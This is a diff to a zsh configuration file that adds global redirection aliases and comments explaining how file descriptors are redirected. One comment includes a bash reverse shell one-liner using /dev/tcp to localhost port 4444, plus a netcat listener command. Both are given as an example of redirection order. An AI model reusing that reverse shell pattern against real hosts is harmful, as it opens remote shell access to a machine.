@@ -18,10 +18,24 @@ function reload_zsh
 
 alias zshrc=reload_zsh
 
-# global aliases
+# global redirection aliases
 
-alias -g noout=" >/dev/null "
-alias -g noerr=" 2>/dev/null "
+alias -g NOOUT=">/dev/null"
+alias -g NOERR="2>/dev/null"
+alias -g OUT2ERR="2>&1"
+alias -g NOOUTPUT="NOOUT NOERR"
+# interesting link on redirections order: https://wiki.bash-hackers.org/howto/redirection_tutorial
+# alias -g NOOUTPUT="3>/dev/null 1>&3 2>&3"
+# ==> creates fd 3 to /dev/null then redirects fd 1,2 to THE VALUE OF fd 3 (an fd of /dev/null)
+#
+# And another one: https://hypothetical.me/post/reverse-shell-in-bash/
+# so a bash reverse shell looks like (listen with `nc -lp 4444`):
+# (in bash): bash -i 3>/dev/tcp/127.0.0.1/4444 >&3 2>&3 0<&3
+# ==> creates fd 3 to tcp connection then redirects fd 0,1,2 to THE VALUE of fd 3 (which is a
+#     bidirectional tcp conn to localhost:4444)
+#     Note: not sure why but `0<&3` and `0>&3` works the same. we assign values of fd to fd, but
+#     not write-only/read-only ? So it's not possible to redirect stdin for reading or writing to
+#     different files?
 
 # Shorters
 
